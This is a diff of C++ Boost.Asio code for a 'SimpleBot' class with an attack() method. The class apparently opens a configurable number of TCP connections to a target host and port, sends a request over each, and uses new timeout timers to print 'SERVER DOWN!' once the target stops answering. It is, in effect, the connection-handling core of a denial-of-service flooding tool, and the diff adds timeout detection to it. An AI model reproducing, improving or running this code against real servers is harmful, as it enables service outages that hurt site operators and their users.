@@ -10,7 +10,7 @@ SimpleBot::SimpleBot(char *target, char *port, char *request, char *socket_numbe
     this->ep = ip::tcp::endpoint(this->target, this->port);
     this->request = std::string(request);
     this->socket_number = (size_t) atoi(socket_number);
-    //this->mut_(mut);
+    this->delim = std::string("/");
 }
 
 void SimpleBot::attack() {
@@ -40,6 +40,11 @@ void SimpleBot::run() {
         if (portion > conns_left) portion = conns_left;
         for (size_t i = 0; i < portion; ++i) {
             socket_ptr sock(new ip::tcp::socket(this->services[indx]));
+
+//            deadline_ptr deadline_(new deadline_timer(sock.get()->get_io_context()));
+//            deadline_.get().e
+//            check_deadline(deadline_, sock);
+
             connect(sock);
         }
         conns_left -= portion;
@@ -62,7 +67,10 @@ void SimpleBot::handle_connect(const boost::system::error_code &ec, socket_ptr s
                                          handle_write(ec, bytes_trans, sock);
                                      });
         //write(*sock, buffer(this->request));
-    } else {
+    }else if (ec == error::timed_out){
+        on_down(sock);
+    }
+    else {
         std::cerr << ec.message() << std::endl;
     }
 
@@ -70,16 +78,32 @@ void SimpleBot::handle_connect(const boost::system::error_code &ec, socket_ptr s
 
 void SimpleBot::handle_write(const boost::system::error_code &ec, size_t bytes_trans, socket_ptr sock) {
     if (!ec) {
-//        std::thread reader(show_read, sock, this->mut_);
-//        reader.detach();
-        //boost::asio::streambuf read_buf;
-        async_read_until(*(sock.get()), this->read_buf, "/",
+        deadline_ptr deadline(new deadline_timer(sock.get()->get_io_context(),
+                                                 microsec_clock::universal_time() + this->timeout));
+        //deadline.get()->expires_from_now(seconds(10))
+        deadline.get()->async_wait(
+                    [this, sock, deadline](const boost::system::error_code& e) {
+                        on_timeout(e, sock, deadline);
+                    });
 
-                                    [this, sock](const boost::system::error_code &ec, size_t bytes_tr) {
-                                        handle_read(ec, bytes_tr, sock);
-                                    });
+        async_read_until(*(sock.get()), this->read_buf, this->delim,
+                         [this, sock, deadline](const boost::system::error_code &ec, size_t bytes_tr) {
+                             handle_read(ec, bytes_tr, sock, deadline);
+                         });
+
+//        async_read_until(*(sock.get()), this->read_buf, this->delim,
+//                         [this, sock](const boost::system::error_code &ec, size_t bytes_tr) {
+//                             handle_read(ec, bytes_tr, sock);
+//                         });
     } else {
-        std::cerr << ec.message() << std::endl;
+        std::cerr << "Mess " << ec.message() << std::endl;
+    }
+}
+
+void SimpleBot::on_timeout(const boost::system::error_code& e, socket_ptr sock, deadline_ptr deadline){
+    if (e != boost::asio::error::operation_aborted)
+    {
+        on_down(sock);
     }
 }
 
@@ -87,14 +111,22 @@ void SimpleBot::handle_write(const boost::system::error_code &ec, size_t bytes_t
 //read_complete(ec, bytes);
 //},
 
-void SimpleBot::handle_read(const boost::system::error_code &ec, size_t bytes_tr, socket_ptr sock) {
+void SimpleBot::on_down(socket_ptr sock){
+    std::cout << "SERVER DOWN!" << std::endl;
+    sock.get()->close();
+    sock.get()->get_io_context().stop();
+}
+
+void SimpleBot::handle_read(const boost::system::error_code &ec, size_t bytes_tr, socket_ptr sock, deadline_ptr deadline) {
     if (!ec) {
+        deadline.get()->cancel_one();
         std::cout << "Received bytes: " << bytes_tr << std::endl;
         std::string res = from_buf_to_string(this->read_buf);
         std::cout << "Received message " << std::string(res.begin(), res.begin()+bytes_tr) << std::endl;
         sock.get()->close();
-    } else {
-        std::cerr << ec.message() << std::endl;
+    } else if (ec == error::operation_aborted || ec == error::eof) {}
+    else{
+        std::cerr <<"Mess "<< ec.message() << std::endl;
     }
 }
 
@@ -102,7 +134,7 @@ size_t SimpleBot::read_complete(const boost::system::error_code & err, size_t by
 {
     if ( err) return 0;
     std::string buf = from_buf_to_string(this->read_buf);
-    ssize_t found = buf.find("/");
+    ssize_t found = buf.find(this->delim);
     return (found < buf.length()) ? 0 : 1;
 }
 
@@ -110,3 +142,25 @@ std::string SimpleBot::from_buf_to_string(boost::asio::streambuf& streambuf){
     return {boost::asio::buffers_begin(streambuf.data()),
             boost::asio::buffers_end(streambuf.data())};
 }
+
+//void SimpleBot::check_deadline(deadline_ptr deadline_, socket_ptr sock)
+//{
+//    // Check whether the deadline has passed. We compare the deadline against
+//    // the current time since a new asynchronous operation may have moved the
+//    // deadline before this actor had a chance to run.
+//    if (deadline_.expires_at() <= deadline_timer::traits_type::now())
+//    {
+//        // The deadline has passed. The socket is closed so that any outstanding
+//        // asynchronous operations are cancelled. This allows the blocked
+//        // connect(), read_line() or write_line() functions to return.
+//        boost::system::error_code ignored_ec;
+//        sock.get()->close(ignored_ec);
+//
+//        // There is no longer an active deadline. The expiry is set to positive
+//        // infinity so that the actor takes no action until a new deadline is set.
+//        deadline_.expires_at(boost::posix_time::pos_infin);
+//    }
+//
+//    // Put the actor back to sleep.
+//    deadline_.async_wait(bind(&SimpleBot::check_deadline, this));
+//}
